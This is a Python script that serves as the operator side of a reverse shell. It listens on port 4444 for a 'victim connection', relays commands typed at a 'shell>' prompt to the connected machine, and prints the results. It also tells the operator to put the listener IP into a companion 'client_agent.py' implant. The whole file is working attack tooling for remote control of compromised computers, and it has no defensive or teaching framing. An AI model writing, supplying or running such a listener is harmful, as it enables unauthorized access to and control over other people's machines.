import socket
import threading
import os

HOST = '0.0.0.0' #listening on all interfaces
PORT = 4444

def handle_client(conn, addr):
    print(f"\n[!] SHELL CONNECTED from {addr}")
    print("[!] Type commands or 'exit' to quit\n")
    
    try:
        while True:
            cmd = input("shell> ")
            
            if cmd.lower() == 'exit':
                conn.send(b'exit\n')
                break
            
            conn.send((cmd + "\n").encode())
            
            # Receive output
            response = conn.recv(4096).decode(errors='ignore')
            print(response, end='')
    except Exception as e:
        print(f"Error: {e}")
    finally:
        conn.close()
        print("[*] Shell closed")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(5)
        
        # Get local IP
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        print("=" * 50)
        print("LISTENER READY")
        print("=" * 50)
        print(f"Listen on: 0.0.0.0:{PORT}")
        print(f"Your IP: {local_ip}")
        print("\n📌 IMPORTANT: Use this IP in client_agent.py!")
        print("=" * 50)
        print("\nWaiting for victim connection...")
        
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.daemon = True
            thread.start()
            
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    start_listener()